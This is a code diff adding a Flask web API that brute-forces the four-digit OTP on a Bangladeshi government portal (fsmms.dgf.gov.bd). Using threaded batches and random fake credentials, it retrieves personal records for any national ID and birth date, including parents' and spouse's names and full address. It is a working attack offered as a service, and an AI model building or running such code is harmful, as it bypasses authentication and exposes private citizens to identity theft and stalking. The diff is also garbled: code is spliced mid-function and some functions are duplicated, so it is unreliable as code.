@@ -154,6 +154,274 @@ def extract_fields(html, ids):
         pattern = rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"'
         match = re.search(pattern, html)
         result[field_id] = match.group(1) if match else ""
+        
+        # Alternative pattern if first one fails
+        if not result[field_id]:
+            pattern2 = rf'name="{field_id}"[^>]*value="([^"]*)"'
+            match2 = re.search(pattern2, html)
+            result[field_id] = match2.group(1) if match2 else ""
+    return result
+
+def enrich_data(nid, dob, contractor_name, result):
+    mapped = {
+        "nameBangla": contractor_name,
+        "nameEnglish": "",
+        "nationalId": nid,
+        "dateOfBirth": dob,
+        "fatherName": result.get("fatherName", ""),
+        "motherName": result.get("motherName", ""),
+        "spouseName": result.get("spouseName", ""),
+        "gender": "",
+        "religion": "",
+        "birthPlace": result.get("nidPerDistrict", ""),
+        "nationality": "Bangladeshi",
+        "division": result.get("nidPerDivision", ""),
+        "district": result.get("nidPerDistrict", ""),
+        "upazila": result.get("nidPerUpazila", ""),
+        "union": result.get("nidPerUnion", ""),
+        "village": result.get("nidPerVillage", ""),
+        "ward": result.get("nidPerWard", ""),
+        "zip_code": result.get("nidPerZipCode", ""),
+        "post_office": result.get("nidPerPostOffice", "")
+    }
+
+    address_parts = []
+    if result.get('nidPerHolding'):
+        address_parts.append(f"বাসা/হোল্ডিং: {result.get('nidPerHolding')}")
+    if result.get('nidPerVillage'):
+        address_parts.append(f"গ্রাম/রাস্তা: {result.get('nidPerVillage')}")
+    if result.get('nidPerMouza'):
+        address_parts.append(f"মৌজা/মহল্লা: {result.get('nidPerMouza')}")
+    if result.get('nidPerUnion'):
+        address_parts.append(f"ইউনিয়ন: {result.get('nidPerUnion')}")
+    if result.get('nidPerWard'):
+        address_parts.append(f"ওয়ার্ড: {result.get('nidPerWard')}")
+    if result.get('nidPerPostOffice'):
+        address_parts.append(f"ডাকঘর: {result.get('nidPerPostOffice')}")
+    if result.get('nidPerZipCode'):
+        address_parts.append(f"জিপ কোড: {result.get('nidPerZipCode')}")
+    if result.get('nidPerUpazila'):
+        address_parts.append(f"উপজেলা: {result.get('nidPerUpazila')}")
+    if result.get('nidPerDistrict'):
+        address_parts.append(f"জেলা: {result.get('nidPerDistrict')}")
+    if result.get('nidPerDivision'):
+        address_parts.append(f"বিভাগ: {result.get('nidPerDivision')}")
+
+    address_line = ", ".join(address_parts)
+
+    mapped["permanentAddress"] = address_line
+    mapped["presentAddress"] = address_line
+    
+    return mapped
+
+@app.route('/')
+def home():
+    return jsonify({
+        "message": "NID Information Extractor API",
+        "status": "active",
+        "version": "1.0.0",
+        "endpoint": "/get-info?nid=YOUR_NID&dob=YYYY-MM-DD",
+        "example": "/get-info?nid=1234567890&dob=1990-01-01",
+        "instructions": "Provide NID and Date of Birth (YYYY-MM-DD) as query parameters"
+    })
+
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({
+        "status": "healthy", 
+        "timestamp": time.time(),
+        "service": "NID Info API"
+    })
+
+@app.route('/test', methods=['GET'])
+def test():
+    return jsonify({
+        "message": "API is working correctly",
+        "timestamp": time.time()
+    })
+
+@app.route('/get-info', methods=['GET'])
+def get_info():
+    start_time = time.time()
+    
+    try:
+        nid = request.args.get('nid')
+        dob = request.args.get('dob')
+        
+        if not nid or not dob:
+            return jsonify({
+                'success': False,
+                'error': 'NID and DOB are required',
+                'usage': '/get-info?nid=1234567890&dob=1990-01-01'
+            }), 400
+
+        # Validate DOB format (YYYY-MM-DD)
+        if not re.match(r'\d{4}-\d{2}-\d{2}', dob):
+            return jsonify({
+                'success': False,
+                'error': 'DOB must be in YYYY-MM-DD format (e.g., 1990-01-01)'
+            }), 400
+
+        # Validate NID (numeric and reasonable length)
+        if not nid.isdigit() or len(nid) < 10 or len(nid) > 17:
+            return jsonify({
+                'success': False,
+                'error': 'NID must be numeric and between 10-17 digits'
+            }), 400
+
+        # ==================== CONFIG ====================
+        mobile_prefix = "016"
+        batch_size = 200  # Reduced for Vercel limits
+
+        # OTP range
+        otp_range = [f"{i:04d}" for i in range(10000)]
+
+        # Generate random credentials
+        mobile = random_mobile(mobile_prefix)
+        password = random_password()
+        
+        print(f"Attempting extraction for NID: {nid}")
+        print(f"Using Mobile: {mobile}")
+        print(f"Using Password: {password}")
+        
+        # Step 1: Get session and bypass initial verification
+        print("Step 1: Bypassing initial verification...")
+        session = get_session_and_bypass(nid, dob, mobile, password)
+        print("✓ Initial bypass successful")
+        
+        # Step 2: Try OTPs in batches
+        print("Step 2: Brute-forcing OTP...")
+        random.shuffle(otp_range)
+        found_otp = None
+        batches_tried = 0
+        
+        for i in range(0, len(otp_range), batch_size):
+            batches_tried += 1
+            batch = otp_range[i:i+batch_size]
+            print(f"Trying batch {batches_tried}/{(len(otp_range)//batch_size)+1}...")
+            found_otp = try_batch(session, batch)
+            if found_otp:
+                print(f"✓ OTP found: {found_otp}")
+                break
+        
+        if found_otp:
+            # Step 3: Fetch form data
+            print("Step 3: Fetching form data...")
+            html = fetch_form_data(session)
+            
+            # Step 4: Extract and enrich data
+            field_ids = [
+                "contractorName", "fatherName", "motherName", "spouseName", 
+                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
+                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice",
+                "nidPerHolding", "nidPerMouza"
+            ]
+            
+            extracted_data = extract_fields(html, field_ids)
+            final_data = enrich_data(nid, dob, extracted_data.get("contractorName", ""), extracted_data)
+            
+            execution_time = round(time.time() - start_time, 2)
+            
+            print("\n" + "="*50)
+            print("EXTRACTION SUCCESSFUL")
+            print("="*50)
+            print(f"Execution Time: {execution_time}s")
+            print(f"OTP Used: {found_otp}")
+            print(f"Batches Tried: {batches_tried}")
+            print(json.dumps(final_data, ensure_ascii=False, indent=2))
+            
+            return jsonify({
+                "success": True,
+                "data": final_data,
+                "metadata": {
+                    "otp_used": found_otp,
+                    "mobile_used": mobile,
+                    "execution_time": f"{execution_time}s",
+                    "batches_tried": batches_tried,
+                    "timestamp": time.time()
+                }
+            }), 200
+            
+        else:
+            execution_time = round(time.time() - start_time, 2)
+            print("✗ OTP not found after all attempts")
+            return jsonify({
+                "success": False,
+                "error": "OTP not found after trying all combinations",
+                "metadata": {
+                    "execution_time": f"{execution_time}s",
+                    "batches_tried": batches_tried,
+                    "timestamp": time.time()
+                }
+            }), 404
+            
+    except Exception as e:
+        execution_time = round(time.time() - start_time, 2)
+        print(f"Error: {str(e)}")
+        return jsonify({
+            'success': False,
+            'error': str(e),
+            'metadata': {
+                'execution_time': f"{execution_time}s",
+                'timestamp': time.time()
+            }
+        }), 500
+
+# Vercel-এর জন্য required
+app = app
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)        
+        if response.status_code == 302 and 'movementContractor/form' in response.headers.get('Location', ''):
+            return otp
+        return None
+    except:
+        return None
+
+def try_batch(session, otp_batch):
+    with ThreadPoolExecutor(max_workers=20) as executor:  # Reduced workers for Vercel
+        future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
+        for future in as_completed(future_to_otp):
+            result = future.result()
+            if result:
+                executor.shutdown(wait=False)
+                return result
+    return None
+
+def fetch_form_data(session):
+    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
+    
+    headers = {
+        'User-Agent': get_random_user_agent(),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Sec-Fetch-Dest': 'document',
+        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'Accept-Language': 'en-US,en;q=0.9',
+    }
+    
+    try:
+        response = session.get(url, headers=headers, timeout=30)
+        return response.text
+    except requests.exceptions.Timeout:
+        raise Exception("Timeout while fetching form data")
+    except requests.exceptions.RequestException as e:
+        raise Exception(f"Network error while fetching form: {str(e)}")
+
+def extract_fields(html, ids):
+    result = {}
+    for field_id in ids:
+        pattern = rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"'
+        match = re.search(pattern, html)
+        result[field_id] = match.group(1) if match else ""
     return result
 
 def enrich_data(nid, dob, contractor_name, result):
